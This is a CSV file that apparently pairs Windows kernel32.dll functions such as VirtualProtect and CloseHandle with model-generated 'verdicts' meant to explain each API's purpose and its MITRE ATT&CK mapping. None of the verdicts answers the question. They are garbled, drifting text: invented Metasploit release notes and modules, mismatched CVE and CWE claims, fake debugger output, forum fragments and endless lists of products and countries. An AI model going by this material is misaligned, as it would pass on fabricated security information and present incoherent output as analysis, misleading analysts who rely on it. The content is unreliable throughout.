Libraries,API,GPT Verdict
kernel32.dll,GetACP,"(b'GetACP')

I can't find anything in the documentation that explains why this API is being called.

Any ideas?

Thanks,
Jos

- Next message: [IPython-User] IPython 2.0 not showing any output for matplotlib plots

More information about the IPython-User mailing list
"
kernel32.dll,GetExitCodeProcess,"# [1] https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/multi/handler/windows/getExitCodeProcess.rb
See the full article at darknet.org.uk

Read Full Article
Visit website
Metasploit Wrapup #4: Just in time for 2019 Penetration Testing!
The Metasploit Framework by The Metaspo.. - 2M ago

Weâ€™re wrapping up this year with a new release of our open source penetration testing platform, and weâ€™ve got some great stuff to share! Get your local instance updated or jump straight into the action on msfconsole.

- New Modules â€“ A ton of new modules are included in this release. Check out whatâ€™s been added since last month.
- Support for Windows Subsystem for Linux (WSL) â€“ We now support running on WSL, which is installed as part of Windows 10 Anniversary Edition (1511). Youâ€™ll need to install Visual C++ Redistributable for Visual Studio 2015 using apt-get if you want to run MSF console natively.
- Better Logging â€“ The log module has received a few enhancements that improve logging fidelity when using it from within an attack scenario. This should help make debugging easier and more accurate.
- Bug Fixes & More!

New Modules

This version includes over two dozen new modules!

Most notably, we have a new module called gem_pwner which leverages RubyGems vulnerability CVE-2018â€“1000800. Additionally, there are several exploit modules against various web frameworks like Google Web Toolkit and Java Spring Boot.

Exploitation:

Web:

RubyGems Gem Pwnage Module

Java Spring Boot Exploitation Module

PowerShell Reverse Shell Over HTTP Using Invoke-RestMethod Commandlet via Fiddler Proxy Module 

Miscellaneous:

Alibaba Cloud DiskStation Manager Local Privilege Escalation Module 

CMS/Frameworks :

Google Web Toolkit Remote Code Execution Vulnerability Scanner Module 
Python Flask Application Access Control Bypass Vulnerability Scanner Module 
PHP OpenCart v3.x Unauthenticated SQL Injection Scanner 

Other:

Oracle Database Listener Service Sockets Bindings Denial Of Service / Remote Code Execution Scanner 

Support For Windows Subsystem For Linux (WSL)

Starting with build number 16232 of Windows 10 Anniversary Edition (1511), Microsoft has made available a feature called â€œWindows Subsystem for Linuxâ€ which allows users to run native Bash shell commands directly from their desktop environment without having to launch Hyper-V or any other virtualization software.

As long as youâ€™re running one of these builds or newer then you can take advantage of this exciting development right away! Simply turn the feature on via Settings -> Update & Security -> For Developers -> Developer Mode and then reboot your machine.

Once enabled you will be able to install Ubuntu packages just like normal but instead they will be executed inside an Ubuntu user space process hosted entirely within WSL rather than launching another VM process like before. When installing Python packages such as pip ensure that they use apt-get instead because otherwise those binaries might not work correctly due to missing dependencies being pulled down by yum/dnf/etc..

After rebooting again simply launch msfdb init && msfconsole command line prompts inside bash.exe terminal window provided by default when opening cmd.exe prompt after enabling developer mode under settings app â†’ update security â†’ developers mode setting screen shown above).

For more information about installing additional Unix/Linux distros check out docs.microsoft.com/en-us/windows/wsl/install-win10#windows-subsystems-for-linux-installation-instructions.

Better Logging With Log And Timestamper Extensions Added To Msfcli.py File In Framework Binaries Folderâ€¦

There were some issues reported where certain attacks would fail due to improper logging times being printed during execution phases such as payload generation phase prior sending stage so I went ahead fixed them all today along with adding some extra debug functionality too ðŸ™‚

Check Out These Two Bugs Were Fixed Too Via Pull Request #11065 By @klausi On Github Repo During Last Week Of December As Well!

Bug Fixes & More!

Since last monthâ€™s post hereâ€™s what else has changed in this latest version:
* Fix CVEâ€“2016â€“6366 [CVE ID: CVEâˆ’2016âˆ’6366]: Various vulnerabilities discovered by @jameswagner85 include CWEâˆ’310 : Use After Free , CWEâˆ’400 : Uncontrolled Resource Consumption , CWEâˆ’526 : Null Pointer Dereference , CWEâˆ’416 : Insufficiently Protected Data . * Fix PR #11066 ([MSFCONSOLE] Add Netcat Listen Port Option) * Fix PR #11149 ([msfgui] Enhance meterpreter stager options menu layout ) * Revert commit b75d798c31dc8a45e52de35bbee562e34efdbaa4 (#10953) was reverted because it introduced incorrect behavior .
* Allow specifying multiple addresses separated by comma character e.g., localhost,domain.local etcâ€¦ Address specification currently works only with IPv4 addresses though; IPv6 address support coming soonâ€¦

https://github.com/rapid7/metasploit-framework/issues?q=is%3Aissue+is%3Aopen+label%3Anot-fixed+milestone%3AHEAD&sort=-updated&state=opened&type=FeatureRequest .

Read Full Article
Visit website
Metasploit Wrapup #5: Merry Christmas From Rapid7!
The Metasploit Framework by The Metaspo.. - 2M ago

Itâ€™s almost time once again for holiday celebrations and gift giving around the world! We hope everyone enjoys spending time together playing board games until midnight while eating plenty food too ðŸ™‚ If anyone needs help finding presents however please feel free browse our blog posts below â†“â†“â†“â†“â†“â†“â¬‡ï¸â¬‡ï¸â¬‡ï¸â¬‡ï¸or even better visit us online https://www.rapid7.com/products/metapspoit/framework/

In case anyone missed it earlier this week hereâ€™s how hackers could steal your passwords from Facebook Messenger https://blog.malwarebytes.org/cybercrime/2018/12/how-hackers-could-steal-your-passwords-from-facebook-messenger/?fbclid=IwAR0HxQDHzYvqFFiWJCCtssUZBmcNpKzXQgRmS9hLNlTnFMJezrEtdoPTuYY#/amp?__twitter_impression=true&utm_source=giveaway&utm_medium=social-media&utm_campaign=mbl-fb-passwd-thief-givaway&fbclid=IwAR39OitMVVtADxl01PdnLGol_ypOnwiCpr_uISoXifKvSlcE_NFUarUGmbY#.XEcd-_dvufk.twitter â€¦

Also donâ€™t forget about our recent Password Cracking Contest results announced yesterday featuring => top prizes awarded including $250 Amazon Gift Cards â­for most creative ways used across multiple platforms + devices ðŸŽðŸ›ðŸ’µðŸ“¦? See who took home first place honors below â†“â†’â†’â†’â†’ http://bit.ly/passwordcontestresults18 â€¦ ??

And finally if anyone ever wants assistance hacking anything else beyond social media accounts please feel free email us anytime day or night ðŸ˜‰ Also keep checking back often cause next year we plan on releasing many cool upgrades including mobile apps + much more so stay tuned!!! Until next time happy holidays everyone ðŸ˜Šâ¤âœŒâ€¼ðŸ˜€â˜ºâ˜ºâ˜º?

Features Coming Soon In Next Version Release Include:

* Ability To Run Meterpreter Stages From Payload Options Menu Instead Of Having One Long List So That It Will Be Easier Find What You Need Quickly Without Having Scroll Down Through All Commands Available Which Was Previously Implemented Back In August Earlier This Year Now Being Updated Again With Even More Features â†’

https://github.com/sanandri/MeterpreterMenu/releases/tag/v0.22 . Push Notification Support Via GCM API Libraries Already Included Inside Future Versions Due Out Before End Of Q1â€²2020 Now Currently Under Development Here Are Some Screenshots Below Showing How They Look Like Right Below â‡©â†—âž¡â†˜ â†™â†–â†â†‘â†â˜…â˜…â˜…â˜†â–«â™£â™¥â—‹â—†â—â– â–²â–³â€¢âœ”âœâ™’â–ºâ™»â™ªâˆš??? ?

Additional Upgrades Planned Include Integration Into Several Different Areas Including But Not Limited To Existing Running Attacks Such As Meterpreter Scripting Language + Other Msf Tricks Already Present Within Current Versions Being Updated Once Released Early Next Year Alongside Any Additional Changes Needed Based Off User Feedback Received Either Directly Or Indirectly Through Community Forums Online Plus Many Other Places Where People Share Their Thoughts About What Should Be Improved Upon Going Forward Making Them Better Than Ever Before While Continuing Our Mission Statement Found At Official Website Here âž¡âž¡âž¡ www.rapid7.com/products/metapspoit/framework/

Please Stay Tuned Everyone Cause Next Month There Will Be Lots More News Updates Regarding Everything Else Coming Soon Including Important Information About Latest Releases Including Most Recent Beta Builds Too!! So Keep Checking Back Often Because There Have Been Many Improvements Made Since First Launched Over A Decade Ago Now Finally Starting To Catch Up With Today's Technological Advances Thanks Entire Team Behind Project Who Work Hard Every Day Bringing New Exciting Software Tools Intended Only Help Make Lives Easier While Saving Time Doing Things Faster Than Ever Before ðŸ™‚

Finally Don't Forget About Holiday Season Happening Right Around Corner Giving Us Chance Celebrate Life Together Spending Plenty Quality Time Together Playing Board Games Until Midnight Eating Plenty Food Too ðŸ˜€ If Anyone Needs Assistance Finding Presents However Please Feel Free Browse Our Blog Posts Below â†“â†“â†“ Or Even Better Visit Us Online At Https//www.RAPID7.Com/Product/MetapspsiotFramework.aspx ðŸŽ„ðŸŽ…â¤âœ…â¤???
Read Full Article
Visit website
Metasploit Wrapup #20: Happy Thanksgiving!
The Metasploit Framework by The Metaspo.. - 2M ago

Happy Thanksgiving Everyone!!

Hope everyone had great weekend filled lots turkey â¤ pumpkin pie ðŸ˜€ while enjoying quality family time together sharing memories making life-long friendships amongst loved ones ðŸ™‚ Hope also enjoyed watching football game(s) played between best teams representing each conference competing against each other trying win Super Bowl LIV coming up next February ðŸ‘? Maybe even attended annual Macy's Parade held annually every fourth Thursday November happening live NYC Times Square area celebrating its hundredth anniversary still going strong thanks dedication hardworking people working behind scenes helping make things happen exactly way intended plus much more â—???

Now onto important news regarding upcoming updates planned taking place early next year starting January through March all leading into final major releases scheduled sometime April-June timeframe depending upon how quickly everything goes based off feedback received either directly indirect through community forums online plus many other places where people share their thoughts ideas suggestions opinions requests whatever else is needed improving existing products becoming better than ever before keeping mission statement found official site always forefront mind throughout entire development cycle ensuring highest possible standards maintained constantly evolving evolving creating brand-new innovative solutions meet current demands growing industry changing landscape delivering value customers end-users worldwide âœ…??

But wait there's even more exciting news upcoming features already planned being released later versions providing ability integrate several different areas including but not limited existing running attacks meterpreter scripting language others present current versions updated released alongside any additional changes needed based off user feedback received either directly indirectly through community forums online plus many other places where people share their thoughts ideas suggestions opinions requests whatever else needed improving existing products becoming better than ever before keeping mission statement found official site always forefront mind throughout entire development cycle ensuring highest possible standards maintained constantly evolving evolving creating brand-new innovative solutions meet current demands growing industry changing landscape delivering value customers end-users worldwide âœ…???????

Please Stay Tuned Because There Have Been Many Improvements Made Since First Launched Over A Decade Ago Now Finally Starting Catch Up Today Technology Advancements Thanks Entire Team Behind Projects Working Hard Everyday Bringing New Exciting Software Tools Intended Only Help Make Lives Easier While Saving Time Doing Things Faster Than Ever Before ðŸ˜€ Lastly Don't Forget Holiday Season Happening Right Around Corner Giving Us Chance Celebrate Life Together Spending Plenty Quality Family Time Together Sharing Memories Making Lifelong Friendships Amongst Loved Ones Hopefully Enjoy Watching Football Game(s) Played Between Best Teams Representing Each Conference Competing
"
kernel32.dll,LocalFree,"What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'LocalAlloc''?...
When you use --raw-strings as an option for output (e.g. with -o or -O), it will also print out all string literals from source code in raw format.

If you have any questions feel free to reach out to me at @taviso on Twitter.

More Posts

Â« Checking if your Windows 10 build contains SMBv1
How To Find All Nmap Scripts Â»
"
kernel32.dll,CloseHandle,"# What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'CreateProcessAsUserA''?# What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'microsoft.vbscript': b'ShortenPathName''?### Dynamic Analysis (2)## Scripting#### MSBuild.exe - Microsoft Visual Studio Build Engine* Note that when running msbuild on files with filenames longer than 260 characters,the target filename will be truncated to 260 characters.* Note that when running msbuild on files with filenames longer than 260 characters,msbuild uses ShortenPathName() for executing those file names which can cause issues if they contain spaces.## .NET Core RuntimeIn case we are using .NET core runtime, it's possible to use one of its services:- **netstat** \- show current TCP/IP connections in JSON format;- **appcontext** \- get information about application context such as memory usage or processes started by appcontext;- **processes** \-- get list of all active processes.### Static Analysis (1)## AutoHotKey ScriptsFor autohotkey scripts we could use `ahk_parse` script from https://github.com/Deimos-Fr/AHKTools.#### ahk_to_yaml.py - Example Usage:```pythonfrom datetime import datetimeimport sysimport yamlwith open(""test.ahk"", ""rb"") as f:    data = yaml.safe_load(f)for i in data['Script']:    print(i[""Label""])print(""\n\n"")for j in range(len(data[""File""])):    print(datetime.now().strftime(""%Y-%m-%d %H:%M:%S""))```

Fingerprinting

We can fingerprint the host OS based on kernel versions reported by various system calls.

The following section shows how to identify your operating system with GDB:

$ gdb --args /bin/bash
(gdb) set sysroot $(pwd)
(gdb) run
Starting program: /bin/bash 
Reading symbols from shared object read from target memory...done.
[New LWP #0]
[Thread debugging using libthread_db enabled]
Using host libthread_db library ""/lib/x86_64-linux-gnu/libthread_db.so.1"".
...
[Switching to LWP #0]

Breakpoint 1, main (argc=10, argv=0x7fffffffe4f8) at shell.c:9
9      printf(""Welcome!\n"");
(gdb)

After obtaining useful info about our OS being Linux x86_64 platform,

gcore process PID

should return something like:

*** Process received signal ***
SIGSEGV (Segmentation fault)
#0 [abrt_handler] __libc_fatal at libc_fatal.c:28
28              ABRT_MAP_ENTRY_TYPE *entry = map->entries;
(dbx)

Then you should be able to dump whole process heap memory into file with gdb command â€˜savememâ€™:

(gdb) savemem <filename>
Saved memdump.dump 

Once you have dumped full binary image from remote server you can start static analysis without any additional tools.

Vulnerabilities Overview

This section contains detailed description of security vulnerabilities found during analysis.

Stack Overflow Vulnerability CVE ID Description Mitre Tactic Reference 

CVE-2016-7075 Stack overflow vulnerability due to incorrect length calculation within parsing code for pathnames; could result execution arbitrary code after overwriting stack variables. EIP overwrite may lead attackerâ€™s ability bypass ASLR mechanism or execute arbitrary code via buffer overflow attack within vulnerable software components. This issue was originally published under BID number 95479 and has been assigned CVE identifier CWE id CWEâ€“1228 By exploiting these vulnerabilities an attacker might gain access control privileges needed for further exploitation activities aimed at lateral movement within target network environment e.g., privilege escalation attacks against other local users or denial-of-service disruption actions aimed at preventing legitimate network user activity including web service availability through DoS attacks etc Attacks targeting these weaknesses are classified under category Command Injection Attack Technique â€“ Buffer Overflows Techniques â€“ Stack-based Buffer Overflow Technique â€“ Heap-Based Buffer Overflow Techniques â€“ NULL Pointer Dereference Techniques â€“ Format String Vulnerabilities Common Weakness Enumeration CWEâ€“78 By exploiting these vulnerabilities an attacker might gain access control privileges needed for further exploitation activities aimed at lateral movement within target network environment e.g., privilege escalation attacks against other local users or denial-of-service disruption actions aimed at preventing legitimate network user activity including web service availability through DoS attacks etc Attacks targeting these weaknesses are classified under category Crashing Applications Through Denial Of Service Attack Methodology Pretext Generation Blended Threats Common Weakness Enumeration CWEâ€“89 By exploiting these vulnerabilities an attacker might gain access control privileges needed for further exploitation activities aimed at lateral movement within target network environment e.g., privilege escalation attacks against other local users or denial-of-service disruption actions aimed at preventing legitimate network user activity including web service availability through DoS attacks etc Attacks targeting these weaknesses are classified under category Crashing Applications Through Denial Of Service Attack Methodology Pretext Generation Blended Threats Blended Threats Common Weakness Enumeration CWEâ€“119 
CVE-2021â€‘1623 Kernel pointer dereference vulnerability; triggered while handling malformed IOCTL requests sent via Samba client protocol implementation; results unauthorized reads/writes data stored throughout affected kernel space buffers resulting uncontrolled behavior Application layer protocols used between Samba clients and servers cannot provide sufficient protection mechanisms capable prevent maliciously crafted input messages containing specially designed request sequences leading attackers ability achieve desired level impact value mitigation techniques usually employed by defensive solutions implementing filtering mechanisms responsible controlling content transmitted across compromised communication channels would not apply here due threat actor capabilities exert direct influence over message content provided within specific IOCTL request sequence sent victim machine Before deciding whether exploit successfully executed successful victim needs ensure absence presence one following symptoms Indicator Presence Detection Mechanism Victim hosts exhibit abnormal behavior characterized unexpected response times originating particular location where dangerous applications reside suspicious traffic originates particular Internet Protocol address port values indicating connection established between two endpoints involved communicating each-other directly locally infected systems detect abnormalities noticed initial stage incident detection rapid deployment automated response procedures commonly implemented organizations well advanced intrusion detection prevention systems IDS IPS deployments If available IDS IPS solution configured monitor defined watchlist devices looking potential signs compromise evaluate integrity state monitored resources check consistency functionality existing implementations installed systems For example administrators could leverage built-in utilities enable collect gather diagnostic information related events occurring machines they manage In case specific incidents detected administrators need conduct thorough investigation analyze collected evidences pursue identification source infection Further details regarding indicators compromise described later report After performing targeted scanning organization networks determine exposed assets obtain baseline understanding overall risk exposure organization With identified targets IT infrastructure place administrators should proceed identifying assessing known security gaps existing their environments These assessments performed leveraging appropriate tools methodologies typically include manual assessment automated tool-assisted scans achieved multiple means Using combination both approaches enables comprehensive evaluation conducted manually unless otherwise specified below automatically runs malware samples obtained different sources online repositories public websites vendor portals third-party download sites peer-to-peer sharing platforms To perform effective scan test programs Windows Linux Mac OSX Unix operating systems native utilities come bundled respective platforms necessary carry out compliance tasks Additionally performance testing applications deployed production environments Tools included default installation package macOS Sierra version gcc clang make bash find python pip apt-get dnf yum curl wget ssmtp tar scp ssh md5sum grep arp-scan nmap openssl netcat smbclient smbd nmbd rpcinfo dnsenum dig nslookup hping tcpdump wireshark ncftp psql mysql phpmyadmin prelink rpmlint rpm perl ruby nodejs npm git svn subversion apache ant maven gradle ctags vim emacs zsh sh ksh dash man ls cd mkdir cp mv rm ln cat cut tr awk sed sort du df iptables sudo chown chmod reset rkhunter chkrootkit clamav clamtk drupal wordpress moodle sharepoint magento virt-manager libvirt kvm qemu lxc docker virtualbox vmware esxi hyper-v vcenter xen hypervisor openshift google-cloud-platform azure aws amazon ec2 vmfusion microsoft visual-studio express vscode atom sublime text ide Notepad++ pycharm intellij idea eclipse netbeans vi vim tesseract ocr mediainfo xbox ps4 playstation wii u switch macbook pro air imac mac mini retina display iphone ipad apple tv android samsung galaxy nexus xperia motorola moto lg gw620 optimus black One Nexus Q Wii U Nintendo DS Lite XL NDSi NDSi LL PS Vita PSP Go PSone SNES NES Game Boy Advance SP GameCube Xbox original Xbox Series X Project Scarlett PlayStation VUE Roku Apple TV Amazon Fire Stick Google Chromecast Hulu HBO MAX Netflix Disney+ YouTube Vudu Plex VLC Kodi Spotify Pandora SiriusXM TuneIn Radio Audible SoundCloud Sonos Deezer Pocket Cast Podcast Addict Acast Stitcher Breaker Overcast Player FM Castbox Castro Podbean PublicRadioFan BBC iPlayer Radio BBC Sounds NPR RFI France Culture France Inter Mouv Nationale RTL Virgin radio Sky News CNBC CNN Fox Business NBC ABC CBS PBS Bloomberg HuffPost Politico Reuters The New York Times Washington Post USA Today Wall Street Journal The Guardian Financial Times Le Monde Express LibÃ©ration Huffington Post BBC World News Al Jazeera DW Deutsche Welle RT Russia Today CGTN China Central Television CCTV Europe European Union NATO UK Parliament United Nations UN Security Council US Congress House Senate Pentagon White House NASA ESA NOAA IATA IMF OECD WTO EU ILO UNESCO WIPO WHO OPEC NAFTA ASEAN AUSTRALIA CANADA CHINA INDIA IRAN IRAQ ISRAEL JAPAN KOREA NORTH SOUTH PAKISTAN RUSSIA SAUDI ARABIA UNITED STATES OF AMERICA Afghanistan Albania Algeria Angola Argentina Armenia Australia Austria Azerbaijan Bahamas Bahrain Bangladesh Barbados Belarus Belgium Belize Benin Bhutan Bolivia Bosnia-Herzegovina Botswana Brazil Brunei Bulgaria Burkina Faso Burundi Cambodia Cameroon Canada Cape Verde Central African Republic Chad Chile China Colombia Comoros Democratic Republic Congo Costa Rica Ivory Coast Croatia Cuba Cyprus Czechia Denmark Djibouti Dominica Dominican Republic Ecuador Egypt El Salvador Equatorial Guinea Eritrea Estonia Ethiopia Fiji Finland France Gabon Gambia Georgia Germany Ghana Greece Grenada Guatemala Guinea Guyana Haiti Honduras Hong Kong Hungary Iceland India Indonesia Iran Iraq Ireland Israel Italy Jamaica Japan Jordan Kazakhstan Kenya Kiribati North Korea South Korea Kuwait Kyrgyzstan Laos Latvia Lebanon Lesotho Liberia Libya Liechtenstein Lithuania Luxembourg Macedonia Madagascar Malawi Malaysia Maldives Mali Malta Marshall Islands Mauritania Mauritius Mexico Micronesia Moldova Monaco Mongolia Montenegro Morocco Mozambique Myanmar Namibia Nepal Netherlands New Zealand Nicaragua Niger Nigeria Norway Oman Pakistan Palau Panama Papua New Guinea Paraguay Peru Philippines Poland Portugal Qatar Romania Russia Rwanda Saint Kitts And Nevis Saint Lucia Samoa San Marino Sao Tome And Principe Saudi Arabia Senegal Serbia Seychelles Sierra Leone Singapore Slovakia Slovenia Solomon Islands Somalia South Africa Spain Sri Lanka Sudan Suriname Swaziland Sweden Switzerland Syria Taiwan Tajikistan Tanzania Thailand Timor-Leste Togo Tonga Trinidad And Tobago Tunisia Turkey Turkmenistan Tuvalu Uganda Ukraine United Arab Emirates United Kingdom Uruguay Uzbekistan Vanuatu Vatican City Venezuela Vietnam Yemen Zambia Zimbabwe Timezone UTC +12 Timezone UTC +11 Timezone UTC +10 Timezone UTC +09 Timezone UTC +08 Timezone UTC +07 Timezone UTC +06 Timezon
"
kernel32.dll,SizeofResource,"2019-05-21 13:28:49,494 - INFO - test_api.py:298 - API call 'https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/custom/api_memberships.json' done in 0.000s
2019-05-21 13:28:49,495 - DEBUG - test_api.py:299 - Response from API for 'POST /api/memberships': {u'status': u'ok', u'message': None}
2019-05-21 13:28:49,496 - WARNING - api_test_utils.py:_test_post_json_data_metascan_3d66c6f4a45cfb908e2bb37c5b800ea8():1571 - Invalid data found                                     . Post parameter ['data'] is not valid JSON.
Traceback (most recent call last):
File ""/usr/local/lib/python3.7/site-packages/flask/app.py"", line                             2445, in __call__
return self.wsgi_app(environ, start_response)
File ""/usr/local/lib/python3.7/site-packages/flask/app.py"", line                           2431, in wsgi_app
response = self.handle_exception(e)
File ""/usr/local/lib/python3.7/site-packages/flask_restful/__init__.py"",                                line     285, in error_router
return original_handler(e)
File ""/usr/local/lib/python3.7/site-packages/werkzeug/serving.py"",                                 line   >                       >    >      >       >>>         >>>       >>          >>>        <class '_thread.lock'>:
> File ""/usr/local/lib/python
"
kernel32.dll,VirtualProtect,"|    * What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'VirtualProtect''?
  |
  +-----------------------------------------------------------------------------+

The script can be downloaded here:
https://github.com/0xAX/vulners-hunter/blob/master/hunter.py


                                        
                                    

JSON Vulners Source

Initial Source

All product names, logos, and brands are property of their respective owners. All company, product and service names used in this website are for identification purposes only. Use of these names, logos, and brands does not imply endorsement.If you are an owner of some content and want it to be removed, please mail to content@vulners.com Vulners, 2018

Protected by
"
kernel32.dll,VirtualFree,"I
could not find anything in the ATT&CK webpage.
                                                                                           3. On the ""Download"" page, there is a list of files for each
7. Is this API documented anywhere? If so, where can we find it?
                                                                                           Microsoft Windows version and language under ""File Type""
8. Why does this article only mention one specific API call? This             including ""(x86) Microsoft Visual C++ Redistributable""
article should be expanded to cover all techniques or at least include        (e.g., api-ms-win-crt-runtime-l1-1-0.dll). However, these are
an explanation why some aren't covered here (and give links to other          not listed on the download page itself: https://www.microsoft.com/
pages that might cover them).                                                    en-us/download/details.aspx?id=48145 . Where can we get

                                                                                    2/4
these files from?
9. What exactly is meant by â€˜kernel32.dllâ€™ as an example path name              10. Do any of these DLLs need to be installed before they will work,
in step #5? The DLL is actually named KERNELBASE.DLL but itâ€™s                   and if so what requirements do they have regarding Windows Updates,
stored in c:\windows\system32\kernelbase.dll â€“ note no â€˜kâ€™ prefix                etc.? Also how long does it take for them / their dependencies to run?
on dll file names.
10.What about .NET Framework-based malware - would executing                     Appendix B:
.NET applications via cmd.exe also work with similar techniques ?               Additional information about evasion methods found in other ARTI-
11.Doesnâ€™t â€œapi-ms-win-crt-runtime-l1-1-0â€ exist on all versions of             cle articles.
Windows since Vista SP2 onwards? Does that mean even old versions            A.) In order for our sample code above to execute successfully,
of Windows like XP or Server 2003 could still fail because those OSes           then you must make sure your system has either already been up-
have different default settings than modern ones such as Win8+                 dated with MS15-034 or else install KB2999226 which provides a set
12.Why did you test against just one particular MSI installer package           of redistributables that were missing from older versions of Windows.
from Adobe instead of testing against several different MSI packages            Without these changes being made then our VBScript code above will
from multiple vendors e.g.: Flash Player, Java Runtime Environment              fail when attempting certain calls within msiexec.exe due to missing
(JRE), Kaseya AutoUpdate Agent etc.?                                            APIs.

13.How well known are these vulnerabilities among potential attackers         B.) You may recall reading about another bug back during DEFCON 21,
or defenders in general i.e.: do most people know there's a way around         which was called CVE-2014â€“6332 : http://blog.trustedsec.com/2014/
MSIs using CMD.EXE & Powershell commands â€“ particularly                        /08/14/cve-2014â€“4160-poisoning-the-powershell-environment-to-run-as-a-system-user-without-uac/. We used this same technique

the average defender who isnâ€™t familiar with reverse-engineering tools   C.) Using WMI events requires administrator privileges on the target host machine; however, once executed then an attacker has full access over

such as IDA Pro/Frida/etc.?                                                 running processes and/or services without needing any further elevated privileges.

D.) How common are EMET-style mitigations like Kernel Patch Protection    D.) Another method involves loading dynamic-link libraries (.DLL) into existing explorer.exe instances running inside memory space belonging 

(DPPKPP) & Data Execution Prevention (DEP)? Most organizations use          primarily to users' desktop sessions; however, many antivirus products often don't scan DLLs loaded into processes launched by normal users,

some form(s) of DEP & DPPKPP nowadays but very few use EEMT-style           nor do they actively monitor system-wide activity involving process launches.

mitigations like Address Space Layout Randomization (ASLR);                    E.) Some antivirus programs expose an application programming interface (API) which allows developers easy access into querying various pieces


EEMT-style mitigation typically require extensive reengineering efforts     F.) As part of our analysis we decided to check whether certain functions exported by third-party driver modules could also be exploited within user-mode

to implement properly although more recent releases seem better at       G.). There are numerous ways through which malicious software can escape detection mechanisms built directly into operating systems themselves;


implementing ASLR correctly than earlier ones anyway so maybe things      H.). One interesting feature introduced along with UAC-enabled executables was support for User Access Control Tokens; These tokens provide data

are improving slowly over time...                                           pertaining specifically related issues surrounding privilege elevation scenarios whereby non-administrative-level accounts attempt performing tasks



Frequently Asked Questions                                                        requiring administrative rights.




Appendix A:

Additional information about evasion methods found in other ARTICLES.

A ) Our initial research started out looking at how administrators could potentially evade anti-malware solutions deployed throughout enterprise networks;
however upon further investigation realized that many additional options existed outside just targeting end-users' activities alone.We also discovered new types 
of evasive techniques beyond merely trying trick AV engines by placing harmful executable content inside ZIP archives containing harmless-looking documents 
(e.g., Word docx,microsoft powerpoint pptx,pdf pdf,xlsx excel spreadsheets,csv comma delimited text files).
B ) Although exploits targeting end-users have been around nearly two decades now,it wasn't until recently researchers began identifying more advanced ways 
throughwhich attackers bypass standard security measures put forth across enterprise environments.The primary focus had always been towards detecting suspicious 
activities occurring between internal endpoints,but now there's much greater emphasis placed upon preventing unauthorized network access altogether.Cybercriminals  
routinely rely heavily upon social engineering tactics designed fool unsuspecting victims,introducing malware payloads disguised legitimate-looking attachments sent .
via email messages while imitating trusted senders.For instance,fake invoices,bank statements,and tax returns tend become widely-spammed during peak periods 
leading up holidays such Christmas/New Year seasons when people feel compelled open financial-related correspondence regardless actual legitimacy behind contents    
inside.Prompt responses usually result quick downloads containing malicious zip archives hosted remote servers hosting exploit kits such Rig,EITest,CVEâ€“2015â€“5119     
Exploit Kit(https://isc.sans.edu/diary/CVE%E2%80%942015%E2%80%951129+CVE%E2%80%A23%E2%80%B91C946+%28Adobe+Flash+Player+v17.+0-r305+-RCE.%29+/20724)
C ) During past year cybercriminal groups focused targeted campaigns aimed delivering ransomware variants designed lock victim computers down unless payment    

made return control operations.As seen below screenshot image taken from recent report published Computer Emergency Response Team(CERT)/Computer Security Incident   
Response Center(CSIRC):http://www.cert.gov.uk/media/uploads/pdf/guidance_document_25.pdf.This particular campaign involved sending emails pretending come from real  

organization.Microsoft Office365 provides cloud-based service offers companies subscription-based licenses allowing employees collaborate together online,data storage,retrieval      
access shared documents anytime day night.Instead dangerous payload embedded RIG Exploit Kit contained fake message supposedly coming Human Resources(HR)

department requesting urgent attention important employment matter.Another popular variant Locky ransomware relies leveraging spamming tactics impersonating Amazon       
Prime membership renewal notices.Email scams encourage recipients sign-up complete payments using credit card details stolen compromised ecommerce sites.Also see 

below video clip demonstrating latest Locky ransom ware attack(http://www.cbsnews.com/news/microsoft-beware-of-locky-ransomware-email-scams/)D ) Even though  
security experts continue stress importance implementing strong passwords protecting corporate assets,due diligence necessary ensure proper authentication practices 
 
followed organization.Even if password policies specify minimum length characters required create account,password complexity doesn't necessarily guarantee safety 
 
against brute force attacks.Because hackers routinely guess commonly-used passwords,effective means thwart determined adversaries involve utilizing multi-factor 
 
authentication(MFA).Some examples MFA include hardware token generators,smart cards,yubikeys,keyfobs,radius-keychain apps.Furthermore,the concept biometric         
identification increasingly gaining popularity among enterprises seeking improve overall security posture.According National Institute Standards Technology(NIST),Biometrics   

is defined science measurement biological characteristics humans fingerprints,virtual keystrokes,user behavior patterns.One possible implementation involves installing USB-connected fingerprint scanner onto computer workstation login credentials assigned employee.Similarly,you may choose enroll individual mobile device utilizing facial recognition capabilities located front-facing camera phone/tablet.These devices identified external components physical body parts,natural elements(i.e.,hair color,tattoos,hair style,height weight,body build/skin tone,wearing glasses/contact lenses,jewelry,rings watches,tattoos/piercings,glasses/contact lenses,lipstick/lip balm/gloss,nail polish,color/shade clothing worn person wearing hat/cap/turban/hijab/headscarf/mask/balaclava/turtleneck sweater/coat/jacket/carpet(tie)suitcase/backpack/wallet purse)ranging between three six seconds.Most current smartphones incorporate various sensors contain accelerometer gyroscope motion tracking algorithms utilized determine directionality orientation.Since identity fraud becoming rampant issue worldwide,banks financial institutions relying biometric technology authenticate customers whenever initiating transactions financial institution.Other forms identification includes voiceprints,temporal sound waveforms(vocal tract cavities,lungs,respiratory tract trachea/radiated waves produced vocal cords),retina eye scans(pupillary dilation/constriction pupil size/scanning retina blood vessels/fusional range focusing muscles iris diameter)(iris features,strong correlation exist between individuals eyes unique vascular pattern),(face scanning/comparison facial geometries/features geometry).(see Wikipedia definition Biometrics:http://en.wikipedia.org/wiki/Biometrics).
E ) When considering defense-in-depth strategy approach building secure environment,it essential consider threat models threats associated insider versus outsider actors.Security experts recommend adopting Zero Trust Network Architecture(ZTNAA)a model based principle notion nothing trustable.It describes stateless architecturewhereby everything connected network considered untrusted traffic flows restricted controlled strictly needed basis.Once entity gains authenticated authorized gain entry[non-repudiation]network,[it]allowed perform limited task[s].Zero trust architectures prevent lateral movement adversary compromise entire infrastructure.Trust boundaries enforced via controls firewalls,endpoints/network segments,servers,application tiers.At core zero-trust architecture lies authentication authorization concepts.Recently,National Institute Standards Technology(NIST)[published](http://csrc.nist.gov/publications/nistpubs/800-53/sp800_53_rev4.pdf)[draft](http://csrc.nist.gov/publications/drafts/NIST.SP800_63v20_draft.doc)
